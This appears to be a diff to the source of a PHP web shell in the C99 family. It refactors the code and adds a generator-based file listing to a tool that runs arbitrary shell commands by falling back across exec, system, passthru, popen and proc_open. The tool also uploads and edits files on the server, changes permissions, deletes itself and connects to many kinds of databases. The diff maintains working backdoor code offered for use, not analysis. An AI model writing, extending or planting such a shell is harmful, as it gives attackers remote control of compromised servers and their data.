@@ -270,53 +270,48 @@ function execute($c, $i = false){
 			//if(!empty($r)) foreach($r as $line) $tmp .= $line;
 			//$r = $tmp;
 			$v = 'exec';
-        } elseif (function_exists('shell_exec') && !in_array('shell_exec', $dis_func)){
+        } else if (function_exists('shell_exec') && !in_array('shell_exec', $dis_func)){
             $r = @shell_exec($c);
 			$v = 'shell_exec';
-        } elseif (function_exists('system') && !in_array('system', $dis_func)){
+        } else if (function_exists('system') && !in_array('system', $dis_func)){
             @ob_start();
             @system($c);
             $r = @ob_get_contents();
             @ob_end_clean();
 			$v = 'system';
-        } elseif (function_exists('passthru') && !in_array('passthru', $dis_func)){
+        } else if (function_exists('passthru') && !in_array('passthru', $dis_func)){
             @ob_start();
             @passthru($c);
             $r = @ob_get_contents();
             @ob_end_clean();
 			$v = 'passthru';
-        } elseif (function_exists('popen') && !in_array('popen', $dis_func)){
+        } else if (function_exists('popen') && !in_array('popen', $dis_func)){
             $h = popen($c, 'r');
             if (is_rource($h)){	
                 if (function_exists('fread') && function_exists('feof')){
-                    while (!feof($h)){
+                    while (!feof($h))
                         $r .= fread($h, 512);
-                    }
-                } elseif (function_exists('fgets') && function_exists('feof')){
-                    while (!feof($h)){
+                } else if (function_exists('fgets') && function_exists('feof')){
+                    while (!feof($h))
                         $r .= fgets($h, 512);
-                    }
                 }
             }
             pclose($h);
 			$v = 'popen';
-        } elseif (function_exists('proc_open') && !in_array('proc_open', $dis_func)){
+        } else if (function_exists('proc_open') && !in_array('proc_open', $dis_func)){
             $ds = array(1 => array('pipe', 'w'));
             //$ds = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
             $h = @proc_open($c, $ds, $pipes);
             //$h = @proc_open($c, $ds, $pipes, getcwd(), array());
             if (is_rource($h)){
                 if (function_exists('fread') && function_exists('feof')){
-                    while (!feof($pipes[1])){
+                    while (!feof($pipes[1]))
                         $r .= fread($pipes[1], 512);
-                    }
-                } elseif (function_exists('fgets') && function_exists('feof')){
-                    while (!feof($pipes[1])){
+                } else if (function_exists('fgets') && function_exists('feof')){
+                    while (!feof($pipes[1]))
                         $r .= fgets($pipes[1], 512);
-                    }
-					/*while (!feof($pipes[2])){
-                        $r .= fgets($pipes[2], 512);
-                    }*/
+					/*while (!feof($pipes[2]))
+                        $r .= fgets($pipes[2], 512);*/
                 }
             }
             @proc_close($h);
@@ -341,7 +336,7 @@ function getfun($n){
 function getcfg($n){
     $result = get_cfg_var($n);
     if ($result == 0) return tText('no', 'no');
-    elseif ($result == 1) return tText('yes', 'yes');
+    else if ($result == 1) return tText('yes', 'yes');
     else return $result;
 }
 
@@ -396,7 +391,7 @@ function zip($files, $archive){
 				if(is_dir($iterator)) $zip->addEmptyDir(str_replace($file.'/', '', $iterator.'/'));
 				else if(is_file($iterator)) $zip->addFromString(str_replace($file.'/', '', $iterator), read_file($iterator));
 			}
-		} elseif(is_file($file)) 
+		} else if(is_file($file)) 
 			$zip->addFromString(basename($file), read_file($file));
 	}
 	if($zip->getStatusString()!==false) return true;
@@ -516,10 +511,10 @@ class PHPZip {
 function compress($type, $archive, $files){
 	if(!is_array($files)) $files = array($files);
 	if($type=='zip'){
-		if(class_exists('ZipArchive')){
+		if(class_exists('ZipArchive'))
 			if (zip($files, $archive)) return true;
-		} else {
-			
+		else {
+			//TODO
 		}
 	} else if (($type=='tar')||($type=='targz')){
 		$archive = basename($archive);
@@ -551,19 +546,19 @@ function decompress($type, $archive, $path){
 					$zip->close();
 				}
 			} else {
-			
+				//TODO
 			}
-		} elseif($type=='untar'){
+		} else if($type=='untar'){
 			$target = basename($archive,'.tar');
 			if(!is_dir($target)) mkdir($target);
 			$before = count(get_all_files($target));
 			execute('tar xf "'.basename($archive).'" -C "'.$target.'"');
 			$after = count(get_all_files($target));
 			if($before!=$after) return true;
-		} elseif($type=='untargz'){
+		} else if($type=='untargz'){
 			$target = '';
 			if(strpos(strtolower($archive), '.tar.gz')!==false) $target = basename($archive,'.tar.gz');
-			elseif(strpos(strtolower($archive), '.tgz')!==false) $target = basename($archive,'.tgz');
+			else if(strpos(strtolower($archive), '.tgz')!==false) $target = basename($archive,'.tgz');
 			if(!is_dir($target)) mkdir($target);
 			$before = count(get_all_files($target));
 			execute('tar xzf "'.basename($archive).'" -C "'.$target.'"');
@@ -1532,12 +1527,12 @@ if (isset($p['me']) && $p['me'] === 'file'){
     function getPerms($filepath){ # C99r16
 		$mode = @fileperms($filepath);
         if (($mode & 0xC000) === 0xC000) $type = 's';     // Socket
-        elseif (($mode & 0x4000) === 0x4000) $type = 'd'; // Directory
-        elseif (($mode & 0xA000) === 0xA000) $type = 'l'; // Symbolic Link
-        elseif (($mode & 0x8000) === 0x8000) $type = '-'; // Regular 
-        elseif (($mode & 0x6000) === 0x6000) $type = 'b'; // Block special
-		elseif (($mode & 0x2000) === 0x2000) $type = 'c'; // Character special
-		elseif (($mode & 0x1000) === 0x1000) $type = 'pa';// FIFO pipe
+        else if (($mode & 0x4000) === 0x4000) $type = 'd'; // Directory
+        else if (($mode & 0xA000) === 0xA000) $type = 'l'; // Symbolic Link
+        else if (($mode & 0x8000) === 0x8000) $type = '-'; // Regular 
+        else if (($mode & 0x6000) === 0x6000) $type = 'b'; // Block special
+		else if (($mode & 0x2000) === 0x2000) $type = 'c'; // Character special
+		else if (($mode & 0x1000) === 0x1000) $type = 'pa';// FIFO pipe
 		else $type = '?';                                 // Unknown
 
 		$owner['read'] = ($mode & 00400) ?    'r' : '-'; 
@@ -1578,30 +1573,30 @@ if (isset($p['me']) && $p['me'] === 'file'){
 	}
 
     function delTree($path){
-            $origipath = $path;
-            $h = opendir($path);
-            while (true){
-                $item = readdir($h);
-                if ($item === '.' or $item === '..'){
-                    continue;
-                } elseif (gettype($item) === 'boolean'){
-                    closedir($h);
-                    if (!@rmdir($path))
-                        return false;
-                    
-                    if ($path == $origipath) 
-                        break;
-                    
-                    $path = substr($path, 0, strrpos($path, DS));
-                    $h = opendir($path);
-                } elseif (is_dir($path . DS . $item)){
-                    closedir($h);
-                    $path = $path . DS . $item;
-                    $h = opendir($path);
-                } else 
-                    unlink($path . DS . $item);
-            }
-            return true;
+		$origipath = $path;
+		$h = opendir($path);
+		while (true){
+		    $item = readdir($h);
+		    if ($item === '.' or $item === '..')
+		        continue;
+		    else if (gettype($item) === 'boolean'){
+		        closedir($h);
+		        if (!@rmdir($path))
+					return false;
+		        
+		        if ($path == $origipath) 
+					break;
+		        
+		        $path = substr($path, 0, strrpos($path, DS));
+		        $h = opendir($path);
+		    } else if (is_dir($path . DS . $item)){
+		        closedir($h);
+		        $path = $path . DS . $item;
+		        $h = opendir($path);
+		    } else 
+		        unlink($path . DS . $item);
+		}
+		return true;
     }
 		
     function recursiveCopy($path, $dest){ 
@@ -1619,7 +1614,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 				}
 			}
 			return true;
-		} elseif(is_file($path)){
+		} else if(is_file($path)){
 			return copy($path, $dest);
 		} else {
 			return false;
@@ -1631,6 +1626,8 @@ if (isset($p['me']) && $p['me'] === 'file'){
 		return pathinfo($file, PATHINFO_EXTENSION);
     }
 	
+	//TODO
+	/*
     function GetWDirList($dir){
             global $dirdata, $j, $shelldir;
             ! $j && $j = 1;
@@ -1667,7 +1664,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
                     $f = str_replace('//', '/', $dir . '/' . $file);
                     if ($file !== '.' && $file !== '..' && is_dir($f)){
                         GetWFileList($f);
-                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
+                    } else if ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
                         if (is_writable($f)){
                             $filedata[$j]['filename'] = str_replace($shelldir, '', $f);
                             $filedata[$j]['size'] = sizecount(@filesize($f));
@@ -1698,7 +1695,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
                     $f = str_replace('//', '/', $dir . '/' . $file);
                     if ($file !== '.' && $file !== '..' && is_dir($f)){
                         GetSFileList($f, $sBuff, $re = 0);
-                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
+                    } else if ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
                         $find = 0;
                         if ($re){
                             if (preg_match('@' . $sBuff . '@', $file) || preg_match('@' . $sBuff . '@', @file_get_contents($f))){
@@ -1728,12 +1725,66 @@ if (isset($p['me']) && $p['me'] === 'file'){
             } else {
                 return array();
             }
-    }		
+    }
+	*/
+	
+	function fileList($typ, $dir, $limit, $page){
+		$c = 0;
+		$show = true;
+		if ($limit){
+			$show = false;
+			if (!isset($page))
+				$page = 1;
+			
+			$start = $limit * ($page - 1);
+			$limit = $limit * $page;
+		}
+		
+		try {
+			if ($res = opendir($dir)){
+				while ($file = readdir($res)){
+					if ($limit)	{
+						if ($c == $start) 
+							$show = true;
+							
+						if ($c == $limit) 
+							break;  
+					}
+					
+					/*
+					//$typ
+					if (@$p['view_writable'] === 'dir'){
+						$dirdata = GetWDirList($currentdir);
+					} else if (@$p['view_writable'] === 'file'){
+						$filedata = GetWFileList($currentdir);
+					} else if (@sValid($p['findstr'])){
+						$filedata = GetSFileList($currentdir, $p['findstr'], $p['re']);
+					} else {
+					*/
+				
+					if (is_dir($dir . $file)){
+						if ($file !== '.' && $file !== '..'){
+							$c++;
+							if ($show)
+								yield array('t'=>'d', 'n'=>$file);
+						}
+					} else if (is_file($dir . $file)){
+						$c++;
+						if ($show)
+							yield array('t'=>'f', 'n'=>$file);
+					} //TODO syslinks 
+				}
+			}
+		} finally {
+			closedir($res);
+			clearstatcache();
+		}
+	}
 
     if (@$p['md'] === 'vs'){
 		$s = dirsize($p['f']);
 		sAjax(is_numeric($s['s']) ? sizecount($s['s']) . ' (' . $s['f'] . ')' : 'Error?');
-	} elseif (@$p['md'] === 'tools'){
+	} else if (@$p['md'] === 'tools'){
 		switch ($p['ac']){
 			case 'cdir':
 				if (file_exists($p['a'] . $p['b']))
@@ -1853,7 +1904,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					sAjax(@rename($p['a'], $p['b']) ? 'OK' : tText('fail', 'Fail!'));
 				break;
 		}
-	} elseif (@$p['md'] === 'info'){
+	} else if (@$p['md'] === 'info'){
 		if (file_exists($p['t'])){
 			$sBuff .= '<h2>' . tText('information', 'Information') . ' [' . mLink(tText('goback', 'Go Back'), 'ajaxLoad("me=file&dir=' . rawurlencode(getUpPath($p['t'])) . '")') . ']</h2>
 					 <table border=0 cellspacing=1 cellpadding=2>
@@ -1949,7 +2000,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 			$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
 		
 		@fclose($fp);
-	} elseif (@$p['md'] === 'edit'){
+	} else if (@$p['md'] === 'edit'){
 		if (file_exists($p['t'])){
 			$filemtime = explode('-', @date('Y-m-d-H-i-s', filemtime($p['t'])));
 			$sBuff .= '<h2>' . tText('edit', 'Edit') . ' [' . mLink(tText('goback', 'Go Back'), 'ajaxLoad("me=file&dir=' . rawurlencode(getUpPath($p['t'])) . '")') . ']</h2>
@@ -1996,7 +2047,6 @@ if (isset($p['me']) && $p['me'] === 'file'){
 		if (isset($p['ac']) && $p['ac'] === 'up')
 			sDialog(@copy($_FILES['upf']['tmp_name'], $p['dir'] . DS . $_FILES['upf']['name']) ? tText('upload', 'Upload') . ' ' . tText('ok', 'Ok!') : tText('fail', 'Fail!'));
 				
-        // Obtenemos el directorio en el que estamos
 		$currentdir = $shelldir;
         if (!empty($p['dir'])){
 			$p['dir'] = fixRoute($p['dir']);
@@ -2066,132 +2116,87 @@ if (isset($p['me']) && $p['me'] === 'file'){
 			mLink(tText('createfile', 'Create file'), 'showUI("cfile", this)') . ' | ' .
 			mLink(tText('upload', 'Upload'), 'up()') . '</td></tr></table><br>';
 
-        $dirdata = $filedata = array();
-		
-		if (@$p['view_writable'] === 'dir'){
-			$dirdata = GetWDirList($currentdir);
-		} elseif (@$p['view_writable'] === 'file'){
-			$filedata = GetWFileList($currentdir);
-		} elseif (@sValid($p['findstr'])){
-			$filedata = GetSFileList($currentdir, $p['findstr'], $p['re']);
-		} else {
-            if (is_dir($currentdir)){
-				if ($res = opendir($currentdir)){
-					$c = $d = 0;
-					$show = true;
-					
-					if ($config['FMLimit']){
-						$show = false;
-						if (!isset($p['pg'])) $p['pg'] = 1; 
-						$start = $config['FMLimit'] * ($p['pg'] - 1);
-						$config['FMLimit'] = $config['FMLimit'] * $p['pg'];
-					}
-
-					while ($file = readdir($res)){
-						if ($config['FMLimit'])	{
-							if ($c == $start) 
-								$show = true;
-								
-							if ($c == $config['FMLimit']) 
-								break;  
-						}
-						
-						if (is_dir($currentdir . $file)){
-							if ($file !== '.' && $file !== '..'){
-								$c++;
-								$d++;
-								if ($show)
-									$dirdata[] = $file;
-							}
-						} else if (is_file($currentdir . $file)){
-							$c++;
-							if ($show)
-								$filedata[] = $file;
-						} //TODO syslinks 
-					}
-					
-					closedir($res);
-					natcasesort($dirdata);
-					natcasesort($filedata);
-				}
-            } else
-				$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
-        }
-		
-		$sBuff .= '<table id="sort" class="explore sortable">
-			<thead><tr data-path="' . getUpPath($currentdir) . '" class="alt1">
-			<td class="alt1 sorttable_nosort">' . mLink('<div class="image lnk"></div>', 'godir(this, false)') . '</td>
-			<td class="touch" width="60%"><b>' . tText('name', 'Name') . '</b></td>
-			<td class="touch"><b>' . tText('date', 'Date') . '</b></td>
-			<td class="touch"><b>' . tText('size', 'Size') . '</b></td>
-			' . (! $isWIN ? '<td class="touch"><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td>' : '') . '
-			<td width="120px"><b>' . tText('actions', 'Actions') . '</b></td>
-			</tr></thead>
-			<tbody>';
-			
+		if (is_dir($currentdir)){
+			$bg = 2;
+			$c = $d = 0;
+			$sBuffFiles = '';
 			$drf = fixRoute($_SERVER['DOCUMENT_ROOT']);
 			$baseURL = str_replace(DS, '/', str_replace($drf, '', $currentdir));
 			$isLinked = strncasecmp($drf, $currentdir, strlen($_SERVER['DOCUMENT_ROOT'])) === 0 ? true : false;
+		
+			$sBuff .= '<table id="sort" class="explore sortable">
+				<thead><tr data-path="' . getUpPath($currentdir) . '" class="alt1">
+				<td class="alt1 sorttable_nosort">' . mLink('<div class="image lnk"></div>', 'godir(this, false)') . '</td>
+				<td class="touch" width="60%"><b>' . tText('name', 'Name') . '</b></td>
+				<td class="touch"><b>' . tText('date', 'Date') . '</b></td>
+				<td class="touch"><b>' . tText('size', 'Size') . '</b></td>
+				' . (! $isWIN ? '<td class="touch"><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td>' : '') . '
+				<td width="120px"><b>' . tText('actions', 'Actions') . '</b></td>
+				</tr></thead>
+				<tbody>';
 			
-			$bg = 2;
-			foreach ($dirdata as $file){
-				$ft = filemtime($currentdir . $file);
-                $sBuff .= '<tr data-path="' . $file . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
-					<td><input type="checkbox" value="' . $file . DS . '" name="dl[]"></td>
-					<td><div class="image dir"></div><a href="#" onclick="godir(this, true);return false;">' . $file . '</a></td>
-					<td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
-					<td><a href="#" onclick="viewSize(this);return false;">[?]</a></td>
-					' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this)";return false;>' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . 
-					'</td>' : '') . '
-					<td>
-					<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
-					<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
-					<div onclick="ajaxLoad(\'me=file&md=info&t=\' + euc(dpath(this, true)));return false;" class="image info"></div>
-					<div onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
-					</td>
-					</tr>';
-            }
+			foreach (fileList($p['view_writable'], $currentdir, $config['FMLimit'], $p['pg']) as $file){
+				$ft = filemtime($currentdir . $file['n']);
+				if ($file['t'] === 'd') {
+					$d++;
+					$sBuff .= '<tr data-path="' . $file['n'] . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
+						<td><input type="checkbox" value="' . $file['n'] . DS . '" name="dl[]"></td>
+						<td><div class="image dir"></div><a href="#" onclick="godir(this, true);return false;">' . $file['n'] . '</a></td>
+						<td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
+						<td><a href="#" onclick="viewSize(this);return false;">[?]</a></td>
+						' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this)";return false;>' . vPermsColor($currentdir . $file['n']) . '</a>&nbsp;' . getUser($currentdir . $file['n']) . 
+						'</td>' : '') . '
+						<td>
+						<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
+						<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
+						<div onclick="ajaxLoad(\'me=file&md=info&t=\' + euc(dpath(this, true)));return false;" class="image info"></div>
+						<div onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
+						</td>
+						</tr>';
+				} else {
+					$c++;
+					$sBuffFiles .= '<tr data-path="' . $file['n'] . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
+						<td width="2%"><input type="checkbox" value="' . $file['n'] . '" name="dl[]"></td><td>';
 
-            foreach ($filedata as $file){
-				$ft = filemtime($currentdir . $file);
-                $sBuff .= '<tr data-path="' . $file . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
-					<td width="2%"><input type="checkbox" value="' . $file . '" name="dl[]"></td><td>';
-
-                if ($currentdir . $file === __file__) $sBuff .= '<div class="image php"></div><font class="my">' . $file . '</font>';
-                elseif($isLinked) $sBuff .= showIcon($file) . ' <a href="' . $baseURL . $file . '" target="_blank">' . $file . '</a>';
-                else $sBuff .= showIcon($file) . ' ' . $file . '</a>';
-               
-			   $sBuff .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
-							<td>' . sizecount(filesize64($currentdir . $file)) . '</td>
-							' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . 
-							'</td>' : '') . '
-							<td>
-							<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
-							<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
-							<div onclick="ajaxLoad(\'me=file&md=info&t=\' + euc(dpath(this, true)));return false;" class="image info"></div>
-							<div onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
-							<div onclick="dl(this);return false;" class="image download"></div>
-							</td></tr>';
-            }
-				
-            $sBuff .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
-					<td width="2%">
-					<input name="chkall" value="" type="checkbox" onclick="CheckAll(this.form);" />
-					</td>
-					<td>
-					' . tText('selected', 'Selected')  . ': ' . mLink(tText('download', 'Download'), 'showUISec("comp", this)') . ' | ' . 
-					mLink(tText('del', 'Del'), 'showUISec("rdel", this)') . ' | ' . mLink(tText('copy', 'Copy'), 'showUISec("copy", this)') . '
-					</td>
-					<td colspan="4" align="right">
-					<b>' . $d . '</b> ' . tText('dirs', 'Directories')  . ' / <b>' . ($c - $d) . '</b> ' . tText('fils', 'Files') . '
-					</td>
-					</tr></tfoot>
-					</table></form>' . mHide('base', $currentdir);
-					
+					if ($currentdir . $file['n'] === __file__) $sBuffFiles .= '<div class="image php"></div><font class="my">' . $file['n'] . '</font>';
+					else if($isLinked) $sBuffFiles .= showIcon($file['n']) . ' <a href="' . $baseURL . $file['n'] . '" target="_blank">' . $file['n'] . '</a>';
+					else $sBuffFiles .= showIcon($file['n']) . ' ' . $file['n'] . '</a>';
+					   
+					$sBuffFiles .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
+						<td>' . sizecount(filesize64($currentdir . $file['n'])) . '</td>
+						' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file['n']) . '</a>&nbsp;' . getUser($currentdir . $file['n']) . 
+						'</td>' : '') . '
+						<td>
+						<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
+						<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
+						<div onclick="ajaxLoad(\'me=file&md=info&t=\' + euc(dpath(this, true)));return false;" class="image info"></div>
+						<div onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
+						<div onclick="dl(this);return false;" class="image download"></div>
+						</td></tr>';
+				}
+			}
 			
-			if ($config['FMLimit'])
-				$sBuff .= genPaginator($p['pg'], ($c < $config['FMLimit'] ? $p['pg'] : -1));
-        }
+			$sBuff .= $sBuffFiles;
+			unset($sBuffFiles);
+			$sBuff .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
+				<td width="2%">
+				<input name="chkall" value="" type="checkbox" onclick="CheckAll(this.form);" />
+				</td>
+				<td>
+				' . tText('selected', 'Selected')  . ': ' . mLink(tText('download', 'Download'), 'showUISec("comp", this)') . ' | ' . 
+				mLink(tText('del', 'Del'), 'showUISec("rdel", this)') . ' | ' . mLink(tText('copy', 'Copy'), 'showUISec("copy", this)') . '
+				</td>
+				<td colspan="4" align="right">
+				<b>' . $d . '</b> ' . tText('dirs', 'Directories')  . ' / <b>' . $c . '</b> ' . tText('fils', 'Files') . '
+				</td>
+				</tr></tfoot>
+				</table></form>' . mHide('base', $currentdir);
+		} else
+			$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
+		
+		if ($config['FMLimit'])
+			$sBuff .= genPaginator($p['pg'], ($c < $config['FMLimit'] ? $p['pg'] : -1));
+	}
 }
 
 if (isset($p['me']) && $p['me'] === 'srm'){
@@ -2202,11 +2207,11 @@ if (isset($p['me']) && $p['me'] === 'srm'){
         } else
             $sBuff .= '<b>' . tText('fail', 'Fail!') . '</b><br>';
     }
+	
 	$r = mt_rand(1337, 9999);
-	$sBuff .= '<form><b>' . tText('del', 'Del') . ': ' . __file__ . '<br><br>' . tText('reminfo', 'For confirmation enter this code') . ': ' . $r . '</b> 
-			' . mHide('me', 'srm') . mHide('rc', $r) . '
-			' . mInput('uc', '') . '&nbsp;&nbsp;&nbsp;<input type="button" value="' . tText('go', 'Go!') . '" onclick="ajaxLoad(serialize(d.forms[0]));return false;" />
-			</form>';
+	$sBuff .= '<form><b>' . tText('del', 'Del') . ': ' . __file__ . '<br><br>' . tText('reminfo', 'For confirmation enter this code') . ': ' . $r . '</b>' . 
+		mHide('me', 'srm') . mHide('rc', $r) . 
+		mInput('uc', '') . '&nbsp;&nbsp;&nbsp;<input type="button" value="' . tText('go', 'Go!') . '" onclick="ajaxLoad(serialize(d.forms[0]));return false;" /></form>';
 }
 
 if (isset($p['me']) && $p['me'] === 'sql'){
@@ -2218,27 +2223,27 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 			if(count($hosts)==2) $host_str = $hosts[0].':'.$hosts[1];
 			else $host_str = $host;
 			if(function_exists('mysqli_connect')) return @mysqli_connect($host_str, $user, $pass);
-			elseif(function_exists('mysql_connect')) return @mysql_connect($host_str, $user, $pass);
-		} elseif($type === 'mssql'){
+			else if(function_exists('mysql_connect')) return @mysql_connect($host_str, $user, $pass);
+		} else if($type === 'mssql'){
 			if(function_exists('mssql_connect')) return @mssql_connect($host, $user, $pass);
-			elseif(function_exists('sqlsrv_connect')){
+			else if(function_exists('sqlsrv_connect')){
 				$coninfo = array('UID'=>$user, 'PWD'=>$pass);
 				return @sqlsrv_connect($host,$coninfo);
 			}
-		} elseif($type === 'pgsql'){
+		} else if($type === 'pgsql'){
 			$hosts = explode(':', $host);
 			if(count($hosts)==2) $host_str = 'host='.$hosts[0].' port='.$hosts[1];
 			else $host_str = 'host='.$host;
 			if(function_exists('pg_connect')) return @pg_connect($host_str.' user='.$user.' password='.$pass);
-		} elseif($type === 'oracle'){ 
+		} else if($type === 'oracle'){ 
 			if(function_exists('oci_connect')) return @oci_connect($user, $pass, $host); 
-		} elseif($type === 'sqlite3'){
+		} else if($type === 'sqlite3'){
 			if(class_exists('SQLite3')) if(!empty($host)) return new SQLite3($host);
-		} elseif($type === 'sqlite'){ 
+		} else if($type === 'sqlite'){ 
 			if(function_exists('sqlite_open')) return @sqlite_open($host); 
-		} elseif($type === 'odbc'){ 
+		} else if($type === 'odbc'){ 
 			if(function_exists('odbc_connect')) return @odbc_connect($host, $user, $pass);
-		} elseif($type === 'pdo'){
+		} else if($type === 'pdo'){
 			if(class_exists('PDO')) if(!empty($host)) return new PDO($host, $user, $pass);
 		}
 		return false;
@@ -2247,31 +2252,31 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 	function sql_query($type, $query, $con){
 		if ($type === 'mysql'){
 			if(function_exists('mysqli_query')) return mysqli_query($con,$query);
-			elseif(function_exists('mysql_query')) return mysql_query($query);
-		} elseif($type === 'mssql'){
+			else if(function_exists('mysql_query')) return mysql_query($query);
+		} else if($type === 'mssql'){
 			if(function_exists('mssql_query')) return mssql_query($query);
-			elseif(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query);
-		} elseif($type === 'pgsql') return pg_query($query);
-		elseif($type === 'oracle') return oci_execute(oci_parse($con, $query));
-		elseif($type === 'sqlite3') return $con->query($query);
-		elseif($type === 'sqlite') return sqlite_query($con, $query);
-		elseif($type === 'odbc') return odbc_exec($con, $query);
-		elseif($type === 'pdo') return $con->query($query);
+			else if(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query);
+		} else if($type === 'pgsql') return pg_query($query);
+		else if($type === 'oracle') return oci_execute(oci_parse($con, $query));
+		else if($type === 'sqlite3') return $con->query($query);
+		else if($type === 'sqlite') return sqlite_query($con, $query);
+		else if($type === 'odbc') return odbc_exec($con, $query);
+		else if($type === 'pdo') return $con->query($query);
 	}
 
 	function sql_num_fields($type, $result, $con){
 		if ($type === 'mysql'){
 			if(function_exists('mysqli_field_count')) return mysqli_field_count($con);
-			elseif (function_exists('mysql_num_fields')) return mysql_num_fields($result);
-		} elseif($type === 'mssql'){
+			else if (function_exists('mysql_num_fields')) return mysql_num_fields($result);
+		} else if($type === 'mssql'){
 			if(function_exists('mssql_num_fields')) return mssql_num_fields($result);
-			elseif(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result);
-		} elseif($type === 'pgsql') return pg_num_fields($result);
-		elseif($type === 'oracle') return oci_num_fields($result);
-		elseif($type === 'sqlite3') return $result->numColumns();
-		elseif($type === 'sqlite') return sqlite_num_fields($result);
-		elseif($type === 'odbc') return odbc_num_fields($result);
-		elseif($type === 'pdo') return $result->columnCount();
+			else if(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result);
+		} else if($type === 'pgsql') return pg_num_fields($result);
+		else if($type === 'oracle') return oci_num_fields($result);
+		else if($type === 'sqlite3') return $result->numColumns();
+		else if($type === 'sqlite') return sqlite_num_fields($result);
+		else if($type === 'odbc') return odbc_num_fields($result);
+		else if($type === 'pdo') return $result->columnCount();
 	}
 
 	function sql_field_name($type,$result,$i){
@@ -2279,19 +2284,19 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 			if(function_exists('mysqli_fetch_fields')){
 				$metadata = mysqli_fetch_fields($result);
 				if(is_array($metadata)) return $metadata[$i]->name;
-			} elseif (function_exists('mysql_field_name')) return mysql_field_name($result,$i);
-		} elseif($type === 'mssql'){
+			} else if (function_exists('mysql_field_name')) return mysql_field_name($result,$i);
+		} else if($type === 'mssql'){
 			if(function_exists('mssql_field_name')) return mssql_field_name($result,$i);
-			elseif(function_exists('sqlsrv_field_metadata')){
+			else if(function_exists('sqlsrv_field_metadata')){
 				$metadata = sqlsrv_field_metadata($result);
 				if(is_array($metadata)) return $metadata[$i]['Name'];
 			}
-		} elseif($type === 'pgsql') return pg_field_name($result,$i);
-		elseif($type === 'oracle') return oci_field_name($result,$i+1);
-		elseif($type === 'sqlite3') return $result->columnName($i);
-		elseif($type === 'sqlite') return sqlite_field_name($result,$i);
-		elseif($type === 'odbc') return odbc_field_name($result,$i+1);
-		elseif($type === 'pdo'){
+		} else if($type === 'pgsql') return pg_field_name($result,$i);
+		else if($type === 'oracle') return oci_field_name($result,$i+1);
+		else if($type === 'sqlite3') return $result->columnName($i);
+		else if($type === 'sqlite') return sqlite_field_name($result,$i);
+		else if($type === 'odbc') return odbc_field_name($result,$i+1);
+		else if($type === 'pdo'){
 			$res = $result->getColumnMeta($i);
 			return $res['name'];
 		}
@@ -2300,48 +2305,48 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 	function sql_fetch_data($type,$result){
 		if ($type === 'mysql'){
 			if(function_exists('mysqli_fetch_row')) return mysqli_fetch_row($result);
-			elseif(function_exists('mysql_fetch_row')) return mysql_fetch_row($result);
-		} elseif($type === 'mssql'){
+			else if(function_exists('mysql_fetch_row')) return mysql_fetch_row($result);
+		} else if($type === 'mssql'){
 			if(function_exists('mssql_fetch_row')) return mssql_fetch_row($result);
